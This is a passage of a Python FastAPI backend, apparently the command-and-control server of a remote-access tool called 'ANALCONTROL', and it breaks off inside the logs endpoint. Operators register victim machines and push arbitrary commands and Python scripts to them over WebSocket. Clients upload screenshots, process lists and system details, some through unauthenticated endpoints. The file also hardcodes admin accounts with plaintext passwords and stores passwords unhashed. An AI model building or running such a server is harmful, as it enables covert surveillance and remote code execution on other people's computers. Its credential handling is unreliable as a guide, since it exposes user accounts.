import os
import sys
import logging
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status, Query, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.responses import JSONResponse, HTMLResponse, FileResponse, StreamingResponse
from pydantic import BaseModel, Field
from typing import List, Dict, Optional, Any
from datetime import datetime, timedelta
import secrets
import json
import jwt
import asyncio
import uuid
import time
from supabase import create_client, Client
import base64
import hashlib
import mimetypes
import io

# ========== CONFIGURATION ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('analcontrol_backend.log')
    ]
)
logger = logging.getLogger(__name__)

# ========== CREATE FASTAPI APP ==========
app = FastAPI(
    title="ANALCONTROL API",
    version="3.0",
    description="Advanced Client Monitoring System with Supabase",
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_url="/openapi.json"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))
SUPABASE_URL = os.getenv("SUPABASE_URL", "https://your-project.supabase.co")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "your-anon-key")
BACKEND_URL = os.getenv("BACKEND_URL", "https://dd-kpxl.onrender.com")

# ========== SUPABASE CLIENT ==========
try:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    logger.info("✅ Supabase client initialized")
except Exception as e:
    logger.error(f"❌ Failed to initialize Supabase: {e}")
    supabase = None

# Security
security = HTTPBearer()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="admin")
    password: str = Field(..., example="admin123")

class UserCreate(BaseModel):
    email: str = Field(..., example="newadmin")
    password: str = Field(..., example="password123")
    confirm_password: str = Field(..., example="password123")
    is_admin: bool = Field(default=True)
    theme: str = Field(default="cyberpunk")

class UserUpdate(BaseModel):
    is_active: Optional[bool] = None
    is_admin: Optional[bool] = None
    theme: Optional[str] = None

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001")
    name: str = Field(..., example="Office Computer")
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Unknown", example="Windows 11")
    hardware_info: Optional[Dict] = Field(default_factory=dict)

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    command: str = Field(..., example="system_info")
    parameters: Dict[str, Any] = Field(default_factory=dict)

class PythonFileRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    filename: str = Field(..., example="script.py")
    content: str = Field(..., description="Python code content")
    parameters: Optional[List[str]] = Field(default_factory=list)

class ScreenshotRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    image_data: str = Field(..., description="Base64 encoded image")
    filename: str = Field(..., example="screenshot.png")

class SystemInfoRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    info: Dict[str, Any] = Field(default_factory=dict)

class ChatMessage(BaseModel):
    message: str = Field(..., description="Message content")
    recipient: Optional[str] = Field(None, description="Recipient user ID (null for all)")
    file_data: Optional[str] = Field(None, description="Base64 encoded file data")
    file_name: Optional[str] = Field(None, description="File name")
    file_type: Optional[str] = Field(None, description="File type")
    is_voice_note: bool = Field(default=False)

class UserTag(BaseModel):
    user_id: str
    role: str = Field(..., description="owner, sr_admin, admin, user")
    color: Optional[str] = Field("#8a2be2", description="Tag color")

# ========== SECURITY FUNCTIONS ==========
def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
    })
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str) -> Optional[dict]:
    """Verify JWT token"""
    try:
        payload = jwt.decode(
            token, 
            JWT_SECRET_KEY, 
            algorithms=["HS256"],
            options={"verify_exp": True}
        )
        return payload
    except jwt.ExpiredSignatureError:
        logger.warning("JWT token expired")
        return None
    except jwt.InvalidTokenError as e:
        logger.warning(f"Invalid JWT token: {e}")
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    """Verify JWT token from request"""
    if not credentials:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Missing authentication token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired authentication token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== SUPABASE HELPER FUNCTIONS ==========
def hash_password(password: str) -> str:
    """Hash password using SHA256 (use bcrypt in production)"""
    return hashlib.sha256(password.encode()).hexdigest()

async def verify_supabase_user(email: str, password: str) -> Optional[dict]:
    """Verify user credentials against Supabase"""
    if not supabase:
        logger.error("Supabase not initialized")
        return None
    
    try:
        # Query users table
        response = supabase.table("users")\
            .select("*")\
            .eq("email", email.lower())\
            .eq("is_active", True)\
            .execute()
        
        if not response.data or len(response.data) == 0:
            return None
        
        user_data = response.data[0]
        
        # Verify password (in production, use proper password hashing)
        hashed_input = hash_password(password)
        
        # For now, accept direct password match or hashed match
        if (user_data.get("password") == password or 
            user_data.get("password_hash") == hashed_input or
            user_data.get("password_hash") == password):
            
            # Update last login
            supabase.table("users")\
                .update({"last_login": datetime.utcnow().isoformat()})\
                .eq("id", user_data["id"])\
                .execute()
            
            return {
                "id": user_data["id"],
                "email": user_data["email"],
                "is_admin": user_data.get("is_admin", False),
                "theme": user_data.get("theme", "cyberpunk"),
                "is_active": user_data.get("is_active", True)
            }
    
    except Exception as e:
        logger.error(f"Supabase auth error: {e}")
    
    return None

async def create_supabase_user(user_data: dict) -> Optional[dict]:
    """Create new user in Supabase"""
    if not supabase:
        return None
    
    try:
        # Check if user exists
        existing = supabase.table("users")\
            .select("*")\
            .eq("email", user_data["email"].lower())\
            .execute()
        
        if existing.data and len(existing.data) > 0:
            return None
        
        # Create user
        new_user = {
            "id": str(uuid.uuid4()),
            "email": user_data["email"].lower(),
            "password": user_data["password"],  # Store plain text (for compatibility)
            "password_hash": hash_password(user_data["password"]),  # Store hash
            "is_admin": user_data.get("is_admin", False),
            "theme": user_data.get("theme", "cyberpunk"),
            "is_active": True,
            "created_at": datetime.utcnow().isoformat(),
            "last_login": None
        }
        
        response = supabase.table("users").insert(new_user).execute()
        
        if response.data:
            return {
                "id": response.data[0]["id"],
                "email": response.data[0]["email"],
                "is_admin": response.data[0].get("is_admin", False),
                "theme": response.data[0].get("theme", "cyberpunk")
            }
    
    except Exception as e:
        logger.error(f"Create Supabase user error: {e}")
    
    return None

# ========== IN-MEMORY DATABASE (FALLBACK) ==========
class Database:
    def __init__(self):
        self.users = {}
        self.clients = {}
        self.commands = []
        self.logs = []
        self.sessions = {}
        self.chat_messages = []
        self.user_tags = {}
        self.files = {}
        self.init_default_data()
        self.init_user_tags()
    
    def init_default_data(self):
        # Default users - with special theme for Nathan
        default_users = [
            {
                "id": str(uuid.uuid4()),
                "email": "xotiic",
                "password": "40671Mps19*",
                "is_admin": True,
                "is_active": True,
                "theme": "cyberpunk",
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            },
            {
                "id": str(uuid.uuid4()),
                "email": "admin",
                "password": "admin123",
                "is_admin": True,
                "is_active": True,
                "theme": "cyberpunk",
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            },
            {
                "id": str(uuid.uuid4()),
                "email": "kizer",
                "password": "kidraper67",
                "is_admin": True,
                "is_active": True,
                "theme": "cyberpunk",
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            },
            {
                "id": str(uuid.uuid4()),
                "email": "nathan",
                "password": "femboy67",
                "is_admin": True,
                "is_active": True,
                "theme": "femboy",  # Special theme for Nathan
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            }
        ]
        
        for user in default_users:
            self.users[user["email"].lower()] = user
        
        
    
    def init_user_tags(self):
        # Special user tags
        self.user_tags["xotiic"] = {
            "user_id": "xotiic",
            "role": "owner",
            "color": "#ff0000",
            "can_create_accounts": True
        }
        self.user_tags["kizer"] = {
            "user_id": "kizer",
            "role": "sr_admin",
            "color": "#ff9900",
            "can_create_accounts": False
        }
        self.user_tags["nathan"] = {
            "user_id": "nathan",
            "role": "admin",
            "color": "#9d65ff",
            "can_create_accounts": False
        }
    
    def get_user_by_email(self, email: str):
        return self.users.get(email.lower())
    
    def update_user_last_login(self, email: str):
        user = self.get_user_by_email(email)
        if user:
            user["last_login"] = datetime.utcnow().isoformat()
    
    def add_chat_message(self, message_data: dict):
        message_id = str(uuid.uuid4())
        message_data["id"] = message_id
        message_data["timestamp"] = datetime.utcnow().isoformat()
        message_data["read_by"] = [message_data["sender"]]
        self.chat_messages.append(message_data)
        return message_data
    
    def get_user_tag(self, user_id: str):
        return self.user_tags.get(user_id.lower())

# Initialize database
db = Database()

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []
        self.chat_connections: Dict[str, WebSocket] = {}  # user_id -> WebSocket

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections.append(websocket)
        logger.info(f"👑 Admin connected. Total admins: {len(self.admin_connections)}")

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        logger.info(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
        
        # Update client status
        if client_id in db.clients:
            db.clients[client_id]["online"] = True
            db.clients[client_id]["ws_online"] = True
            db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
        
        # Store in Supabase if available
        if supabase:
            try:
                supabase.table("clients")\
                    .update({
                        "online": True,
                        "ws_online": True,
                        "last_seen": datetime.utcnow().isoformat()
                    })\
                    .eq("client_id", client_id)\
                    .execute()
            except Exception as e:
                logger.error(f"Supabase update client error: {e}")
        
        # Notify admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat(),
            "total_clients": len(self.client_connections)
        })

    async def connect_chat(self, websocket: WebSocket, user_id: str):
        await websocket.accept()
        self.chat_connections[user_id] = websocket
        logger.info(f"💬 Chat connected: {user_id}. Total chat users: {len(self.chat_connections)}")
        
        # Notify others about user online status
        await self.broadcast_chat({
            "type": "user_online",
            "user_id": user_id,
            "timestamp": datetime.utcnow().isoformat()
        }, exclude_user=user_id)
        
        # Send initial messages
        await self.send_chat_history(user_id)
        await self.send_user_list(user_id)
    
    async def send_chat_history(self, user_id: str):
        """Send chat history to user"""
        if user_id in self.chat_connections:
            try:
                # Get last 50 messages
                messages = db.chat_messages[-50:] if len(db.chat_messages) > 50 else db.chat_messages
                
                await self.chat_connections[user_id].send_json({
                    "type": "chat_history",
                    "messages": messages,
                    "timestamp": datetime.utcnow().isoformat()
                })
            except Exception as e:
                logger.error(f"Error sending chat history: {e}")
    
    async def send_user_list(self, user_id: str):
        """Send online user list"""
        if user_id in self.chat_connections:
            try:
                online_users = list(self.chat_connections.keys())
                user_data = []
                
                for uid in online_users:
                    user = db.get_user_by_email(uid) or next((u for u in db.users.values() if u["email"] == uid), None)
                    if user:
                        tag = db.get_user_tag(user["email"])
                        user_data.append({
                            "user_id": user["email"],
                            "username": user["email"],
                            "role": tag["role"] if tag else "user",
                            "color": tag["color"] if tag else "#8a2be2",
                            "online": True
                        })
                
                await self.chat_connections[user_id].send_json({
                    "type": "user_list",
                    "users": user_data,
                    "timestamp": datetime.utcnow().isoformat()
                })
            except Exception as e:
                logger.error(f"Error sending user list: {e}")

    def disconnect(self, websocket: WebSocket):
        # Remove from admin connections
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
            logger.info(f"👑 Admin disconnected. Total admins: {len(self.admin_connections)}")
        
        # Remove from client connections
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            logger.info(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
            
            # Update client status
            if client_id in db.clients:
                db.clients[client_id]["online"] = False
                db.clients[client_id]["ws_online"] = False
            
            # Update Supabase
            if supabase:
                try:
                    supabase.table("clients")\
                        .update({
                            "ws_online": False
                        })\
                        .eq("client_id", client_id)\
                        .execute()
                except Exception as e:
                    logger.error(f"Supabase update client offline error: {e}")
            
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat(),
                "total_clients": len(self.client_connections)
            }))
        
        # Remove from chat connections
        chat_user_id = None
        for uid, ws in self.chat_connections.items():
            if ws == websocket:
                chat_user_id = uid
                break
        
        if chat_user_id:
            del self.chat_connections[chat_user_id]
            logger.info(f"💬 Chat disconnected: {chat_user_id}. Total chat users: {len(self.chat_connections)}")
            
            # Notify others about user offline status
            asyncio.create_task(self.broadcast_chat({
                "type": "user_offline",
                "user_id": chat_user_id,
                "timestamp": datetime.utcnow().isoformat()
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.error(f"Failed to send to admin: {e}")
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict) -> bool:
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                logger.error(f"Failed to send to client {client_id}: {e}")
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False
    
    async def broadcast_chat(self, message: dict, exclude_user: str = None):
        """Send message to all chat users except specified user"""
        disconnected = []
        for uid, connection in self.chat_connections.items():
            if uid != exclude_user:
                try:
                    await connection.send_json(message)
                except Exception as e:
                    logger.error(f"Failed to send chat to {uid}: {e}")
                    disconnected.append(uid)
        
        # Remove disconnected users
        for uid in disconnected:
            if uid in self.chat_connections:
                del self.chat_connections[uid]
    
    async def send_to_user(self, user_id: str, message: dict) -> bool:
        """Send message to specific user"""
        if user_id in self.chat_connections:
            try:
                await self.chat_connections[user_id].send_json(message)
                return True
            except Exception as e:
                logger.error(f"Failed to send to user {user_id}: {e}")
                return False
        return False

manager = ConnectionManager()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint - tries Supabase first, falls back to in-memory"""
    try:
        logger.info(f"Login attempt for user: {data.email}")
        
        user_data = None
        
        # Try Supabase first
        if supabase:
            user_data = await verify_supabase_user(data.email, data.password)
        
        # Fallback to in-memory database
        if not user_data:
            user = db.get_user_by_email(data.email)
            
            if not user:
                logger.warning(f"User not found: {data.email}")
                raise HTTPException(status_code=401, detail="Invalid credentials")
            
            if not user.get("is_active", True):
                logger.warning(f"User account inactive: {data.email}")
                raise HTTPException(status_code=401, detail="Account is inactive")
            
            if user.get("password") != data.password:
                logger.warning(f"Password verification failed for user: {data.email}")
                raise HTTPException(status_code=401, detail="Invalid credentials")
            
            user_data = {
                "id": user["id"],
                "email": user["email"],
                "is_admin": user.get("is_admin", False),
                "theme": user.get("theme", "cyberpunk"),
                "is_active": user.get("is_active", True)
            }
            
            # Update last login
            db.update_user_last_login(data.email)
        
        logger.info(f"✅ User authenticated: {user_data.get('email')}")
        
        # Create JWT token
        token_data = {
            "sub": user_data["email"],
            "email": user_data["email"],
            "is_admin": user_data["is_admin"],
            "user_id": user_data["id"],
            "theme": user_data.get("theme", "cyberpunk")
        }
        
        access_token = create_jwt_token(token_data)
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user_data["email"],
                "is_admin": user_data["is_admin"],
                "user_id": user_data["id"],
                "theme": user_data.get("theme", "cyberpunk")
            },
            "expires_in": 86400
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/create-account", response_model=dict)
async def create_account(data: UserCreate, user: dict = Depends(authenticate_user)):
    """Create a new user account (xotiic only)"""
    try:
        # Check if user is xotiic (owner)
        if user.get("email") != "xotiic":
            raise HTTPException(status_code=403, detail="Only xotiic can create accounts")
        
        # Check if passwords match
        if data.password != data.confirm_password:
            raise HTTPException(status_code=400, detail="Passwords do not match")
        
        if len(data.password) < 6:
            raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
        
        # Try to create in Supabase first
        new_user = None
        if supabase:
            new_user = await create_supabase_user({
                "email": data.email,
                "password": data.password,
                "is_admin": data.is_admin,
                "theme": data.theme
            })
        
        # Fallback to in-memory database
        if not new_user and not db.get_user_by_email(data.email):
            new_user = {
                "id": str(uuid.uuid4()),
                "email": data.email,
                "password": data.password,
                "is_admin": data.is_admin,
                "theme": data.theme,
                "is_active": True,
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            }
            
            db.users[data.email.lower()] = new_user
            logger.info(f"✅ Account created in memory for: {data.email}")
        
        if not new_user:
            raise HTTPException(status_code=400, detail="User already exists")
        
        return {
            "success": True,
            "message": "Account created successfully",
            "email": data.email,
            "is_admin": data.is_admin,
            "theme": data.theme
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Create account error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/users", response_model=dict)
async def get_users(user: dict = Depends(authenticate_user)):
    """Get all users (admin only)"""
    try:
        # Check if user is admin
        if not user.get("is_admin"):
            raise HTTPException(status_code=403, detail="Admin access required")
        
        users = []
        
        # Get from Supabase if available
        if supabase:
            response = supabase.table("users")\
                .select("id, email, is_admin, theme, is_active, last_login, created_at")\
                .execute()
            
            if response.data:
                users = response.data
        
        # Add in-memory users
        for user_data in db.users.values():
            users.append({
                "id": user_data["id"],
                "email": user_data["email"],
                "is_admin": user_data.get("is_admin", False),
                "theme": user_data.get("theme", "cyberpunk"),
                "is_active": user_data.get("is_active", True),
                "created_at": user_data.get("created_at"),
                "last_login": user_data.get("last_login")
            })
        
        # Remove duplicates
        unique_users = {}
        for u in users:
            if u["email"] not in unique_users:
                unique_users[u["email"]] = u
        
        return {
            "success": True,
            "users": list(unique_users.values())
        }
        
    except Exception as e:
        logger.error(f"Get users error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            client_ip = request.headers.get('X-Forwarded-For', request.client.host)
            if client_ip:
                data.ip_address = client_ip.split(',')[0].strip()
            else:
                data.ip_address = "Unknown"
        
        # Check if client exists in memory
        action = "updated" if data.client_id in db.clients else "registered"
        
        # Update in-memory database
        client_data = {
            "id": str(uuid.uuid4()) if data.client_id not in db.clients else db.clients[data.client_id]["id"],
            "client_id": data.client_id,
            "name": data.name,
            "ip_address": data.ip_address,
            "os_info": data.os_info,
            "hardware_info": data.hardware_info or {},
            "online": True,
            "last_seen": datetime.utcnow().isoformat(),
            "registered_at": datetime.utcnow().isoformat() if action == "registered" else db.clients[data.client_id].get("registered_at", datetime.utcnow().isoformat())
        }
        
        db.clients[data.client_id] = client_data
        
        # Store in Supabase if available
        if supabase:
            try:
                # Check if client exists in Supabase
                existing = supabase.table("clients")\
                    .select("*")\
                    .eq("client_id", data.client_id)\
                    .execute()
                
                client_data_db = {
                    "client_id": data.client_id,
                    "name": data.name,
                    "ip_address": data.ip_address,
                    "os_info": data.os_info,
                    "hardware_info": data.hardware_info or {},
                    "online": True,
                    "last_seen": datetime.utcnow().isoformat(),
                    "updated_at": datetime.utcnow().isoformat()
                }
                
                if existing.data and len(existing.data) > 0:
                    # Update existing
                    supabase.table("clients")\
                        .update(client_data_db)\
                        .eq("client_id", data.client_id)\
                        .execute()
                else:
                    # Create new
                    client_data_db.update({
                        "registered_at": datetime.utcnow().isoformat(),
                        "created_at": datetime.utcnow().isoformat()
                    })
                    supabase.table("clients").insert(client_data_db).execute()
                
            except Exception as e:
                logger.error(f"Supabase client registration error: {e}")
        
        # Add log entry
        log_entry = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Client {action}: {data.name} ({data.client_id})",
            "created_at": datetime.utcnow().isoformat()
        }
        
        db.logs.append(log_entry)
        
        # Store log in Supabase
        if supabase:
            try:
                supabase.table("logs").insert({
                    "client_id": data.client_id,
                    "log_type": "info",
                    "message": f"Client {action}: {data.name}",
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase log insertion error: {e}")
        
        logger.info(f"Client {action}: {data.client_id}")
        
        return {
            "success": True, 
            "message": f"Client {action} successfully",
            "client_id": data.client_id,
            "action": action
        }
        
    except Exception as e:
        logger.error(f"Client registration error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/clients", response_model=dict)
async def get_clients(
    user: dict = Depends(authenticate_user),
    online_only: bool = Query(False),
    search: Optional[str] = Query(None)
):
    """Get all clients"""
    try:
        clients_list = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("clients").select("*")
            
            if search:
                query = query.or_(f"name.ilike.%{search}%,client_id.ilike.%{search}%")
            
            response = query.order("last_seen", desc=True).execute()
            
            if response.data:
                clients_list = response.data
        else:
            # Fallback to in-memory
            clients_list = list(db.clients.values())
            
            if search:
                search_lower = search.lower()
                clients_list = [c for c in clients_list if 
                              search_lower in c.get("client_id", "").lower() or
                              search_lower in c.get("name", "").lower() or
                              search_lower in c.get("ip_address", "").lower()]
        
        # Filter if needed
        if online_only:
            clients_list = [c for c in clients_list if c.get("online")]
        
        # Mark clients as online if they have active WebSocket connections
        for client in clients_list:
            client["ws_online"] = client.get("client_id") in manager.client_connections
        
        # Sort by last seen
        clients_list.sort(key=lambda x: x.get("last_seen", ""), reverse=True)
        
        return {
            "success": True,
            "clients": clients_list
        }
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, user: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        # Check if client exists
        client_exists = False
        if supabase:
            response = supabase.table("clients")\
                .select("*")\
                .eq("client_id", data.client_id)\
                .execute()
            client_exists = bool(response.data)
        else:
            client_exists = data.client_id in db.clients
        
        if not client_exists:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Create command record
        command_id = str(uuid.uuid4())
        command_data = {
            "id": command_id,
            "client_id": data.client_id,
            "command": data.command,
            "parameters": data.parameters,
            "status": "pending",
            "user_email": user.get("email", "unknown"),
            "created_at": datetime.utcnow().isoformat()
        }
        
        # Store in memory
        db.commands.append(command_data)
        
        # Store in Supabase
        if supabase:
            try:
                supabase.table("commands").insert(command_data).execute()
            except Exception as e:
                logger.error(f"Supabase command storage error: {e}")
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": command_id,
            "command": data.command,
            "parameters": data.parameters,
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user.get("email", "unknown")
        })
        
        if not sent:
            # Update command status if WebSocket failed
            command_data["status"] = "failed"
            command_data["error"] = "Client not connected"
            
            if supabase:
                try:
                    supabase.table("commands")\
                        .update({
                            "status": "failed",
                            "error": "Client not connected"
                        })\
                        .eq("id", command_id)\
                        .execute()
                except Exception as e:
                    logger.error(f"Supabase command update error: {e}")
        
        return {
            "success": True,
            "command_id": command_id,
            "sent_via_websocket": sent,
            "client_id": data.client_id,
            "message": "Command queued for execution"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send command error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/execute-python", response_model=dict)
async def execute_python_file(data: PythonFileRequest, user: dict = Depends(authenticate_user)):
    """Execute Python file on client"""
    try:
        # Check if client is connected via WebSocket
        if data.client_id not in manager.client_connections:
            raise HTTPException(status_code=400, detail="Client not connected")
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "python_execute",
            "command_id": str(uuid.uuid4()),
            "filename": data.filename,
            "content": data.content,
            "parameters": data.parameters or [],
            "from_user": user.get("email", "unknown"),
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if not sent:
            raise HTTPException(status_code=400, detail="Failed to send command to client")
        
        # Log the execution
        log_entry = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Python execution sent: {data.filename}",
            "created_at": datetime.utcnow().isoformat()
        }
        
        db.logs.append(log_entry)
        
        if supabase:
            try:
                supabase.table("logs").insert({
                    "client_id": data.client_id,
                    "log_type": "info",
                    "message": f"Python execution sent: {data.filename}",
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase Python log error: {e}")
        
        return {
            "success": True,
            "message": "Python file sent for execution",
            "filename": data.filename,
            "client_id": data.client_id
        }
        
    except Exception as e:
        logger.error(f"Execute Python error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/screenshot", response_model=dict)
async def upload_screenshot(data: ScreenshotRequest):
    """Upload screenshot"""
    try:
        # Validate image data
        try:
            image_data = base64.b64decode(data.image_data)
        except:
            raise HTTPException(status_code=400, detail="Invalid image data")
        
        # Store in memory
        screenshot_data = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "image_data": data.image_data,
            "filename": data.filename,
            "size": len(image_data),
            "created_at": datetime.utcnow().isoformat()
        }
        
        # We'll just store metadata, not the actual image in memory
        screenshot_metadata = {
            "id": screenshot_data["id"],
            "client_id": data.client_id,
            "filename": data.filename,
            "size": len(image_data),
            "created_at": datetime.utcnow().isoformat()
        }
        
        # Store in Supabase if available
        if supabase:
            try:
                supabase.table("screenshots").insert(screenshot_data).execute()
            except Exception as e:
                logger.error(f"Supabase screenshot storage error: {e}")
        
        # Add log
        log_entry = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Screenshot captured: {data.filename}",
            "created_at": datetime.utcnow().isoformat()
        }
        
        db.logs.append(log_entry)
        
        if supabase:
            try:
                supabase.table("logs").insert({
                    "client_id": data.client_id,
                    "log_type": "info",
                    "message": f"Screenshot captured: {data.filename}",
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase screenshot log error: {e}")
        
        return {
            "success": True,
            "message": "Screenshot uploaded",
            "filename": data.filename,
            "size": len(image_data)
        }
        
    except Exception as e:
        logger.error(f"Upload screenshot error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/system-info", response_model=dict)
async def upload_system_info(data: SystemInfoRequest):
    """Upload system information"""
    try:
        # Store in memory
        system_info_data = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "info": data.info,
            "created_at": datetime.utcnow().isoformat()
        }
        
        # Store in Supabase if available
        if supabase:
            try:
                supabase.table("system_info").insert({
                    "client_id": data.client_id,
                    "cpu_info": data.info.get("cpu", {}),
                    "memory_info": data.info.get("memory", {}),
                    "disk_info": data.info.get("disk", {}),
                    "network_info": data.info.get("network", {}),
                    "process_list": data.info.get("processes", []),
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase system info storage error: {e}")
        
        return {
            "success": True,
            "message": "System information uploaded",
            "client_id": data.client_id
        }
        
    except Exception as e:
        logger.error(f"Upload system info error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/commands", response_model=dict)
async def get_commands(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    limit: int = Query(50, ge=1, le=1000)
):
    """Get recent commands"""
    try:
        commands_list = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("commands").select("*")
            
            if client_id:
                query = query.eq("client_id", client_id)
            
            if status:
                query = query.eq("status", status)
            
            response = query.order("created_at", desc=True).limit(limit).execute()
            
            if response.data:
                commands_list = response.data
        else:
            # Fallback to in-memory
            commands_list = db.commands.copy()
            
            # Apply filters
            if client_id:
                commands_list = [c for c in commands_list if c.get("client_id") == client_id]
            
            if status:
                commands_list = [c for c in commands_list if c.get("status") == status]
            
            # Sort by date
            commands_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
            commands_list = commands_list[:limit]
        
        return {
            "success": True,
            "commands": commands_list
        }
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/logs", response_model=dict)
async def get_logs(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    log_type: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=1000)
):
    """Get system logs"""
    try:
        logs_list = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("logs").select("*")
            
            if client_id:
                query = query.eq("client_id", client_id)
            
            if log_type and log_type != "all":
                query = query.eq("log_type", log_type)
            
            response = query.order("created_at", desc=True).limit(limit).execute()
            
            if response.data:
                logs_list = response.data
        else:
            # Fallback to in-memory
